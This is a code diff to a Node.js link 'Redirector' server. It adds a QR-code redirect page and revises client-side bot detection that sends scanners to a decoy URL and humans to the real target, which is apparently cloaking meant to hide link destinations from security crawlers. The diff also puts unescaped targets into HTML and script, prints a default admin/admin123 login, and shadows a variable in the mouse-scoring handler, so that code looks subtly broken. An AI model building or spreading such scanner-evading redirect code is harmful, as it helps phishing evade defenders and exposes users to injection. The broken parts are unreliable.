@@ -507,6 +1317,46 @@ app.get('/v/:id', strictLimiter, async (req, res) => {
     return res.redirect(`/expired?target=${encodeURIComponent(BOT_URLS[0])}`);
   }
 
+  // If QR was requested, show QR code before redirect
+  if (showQr) {
+    const qrData = await QRCode.toDataURL(data.target);
+    return res.send(`
+      <!DOCTYPE html>
+      <html>
+      <head>
+        <title>QR Code - Redirector</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta http-equiv="refresh" content="5;url=${data.target}">
+        <style>
+          body{font-family:sans-serif;background:linear-gradient(135deg,#667eea 0,#764ba2 100%);display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;padding:20px}
+          .card{background:white;padding:2rem;border-radius:16px;text-align:center;max-width:400px}
+          img{max-width:100%;height:auto;border-radius:8px;margin:1rem 0}
+          .countdown{color:#666;margin-top:1rem}
+        </style>
+      </head>
+      <body>
+        <div class="card">
+          <h2>📱 Scan QR Code</h2>
+          <img src="${qrData}" alt="QR Code">
+          <p>Or continue to website...</p>
+          <div class="countdown">Redirecting in <span id="countdown">5</span> seconds</div>
+        </div>
+        <script>
+          let time = 5;
+          const interval = setInterval(() => {
+            time--;
+            document.getElementById('countdown').textContent = time;
+            if (time <= 0) {
+              clearInterval(interval);
+              window.location.href = '${data.target}';
+            }
+          }, 1000);
+        </script>
+      </body>
+      </html>
+    `);
+  }
+
   const hpSuffix = crypto.randomBytes(2).toString('hex');
   const nonce = res.locals.nonce;
 
@@ -527,16 +1377,18 @@ app.get('/v/:id', strictLimiter, async (req, res) => {
       const F='${BOT_URLS[0]}';
       let m=0,e=0,lx=0,ly=0,lt=Date.now();
       
-      document.addEventListener('mousemove',e=>{
+      document.addEventListener('mousemove',function(e){
         if(lx&&ly){
-          const dt=(Date.now()-lt)/1e3||1;
-          e+=Math.log2(1+Math.hypot(e.clientX-lx,e.clientY-ly))/dt;
+          const dt=(Date.now()-lt)/1000||1;
+          const distance = Math.hypot(e.clientX-lx, e.clientY-ly);
+          const speed = distance / dt;
+          e = Math.log2(1 + speed);
           m++;
         }
         lx=e.clientX; ly=e.clientY; lt=Date.now();
       },{passive:true});
       
-      setTimeout(()=>{
+      setTimeout(function(){
         const sus = e<2.5 || m<2 || document.getElementById('hp_${hpSuffix}')?.value;
         location.href = sus ? F : T;
       },1200);
@@ -588,13 +1440,16 @@ app.use((err, req, res, next) => {
 });
 
 // ─── Start Server ────────────────────────────────────────────────────────────
-const server = app.listen(PORT, '0.0.0.0', () => {
-  console.log(`[STARTUP] 🚀 Redirector v2.0 - Mobile Optimized`);
+server.listen(PORT, '0.0.0.0', () => {
+  console.log(`[STARTUP] 🚀 Redirector v3.0 - Complete Edition`);
   console.log(`[STARTUP] 📡 Port: ${PORT}`);
   console.log(`[STARTUP] 🔑 Metrics: ${METRICS_API_KEY.substring(0, 8)}...`);
   console.log(`[STARTUP] ⏱️  Link TTL: ${formatDuration(LINK_TTL_SEC)} (${LINK_TTL_SEC} seconds)`);
   console.log(`[STARTUP] 📱 Mobile devices: ALWAYS PASS (threshold: 20)`);
-  console.log(`[STARTUP] 💡 To change TTL, set LINK_TTL in .env (e.g., LINK_TTL=24h, LINK_TTL=7d, LINK_TTL=3600)`);
+  console.log(`[STARTUP] 💡 Admin UI: http://localhost:${PORT}/admin`);
+  console.log(`[STARTUP] 💡 Default admin: admin / admin123 (CHANGE IN PRODUCTION!)`);
+  console.log(`[STARTUP] 💡 QR Codes: /qr?url=YOUR_URL`);
+  console.log(`[STARTUP] 💡 Socket.IO: Real-time monitoring active`);
 });
 
 server.keepAliveTimeout = 30000;
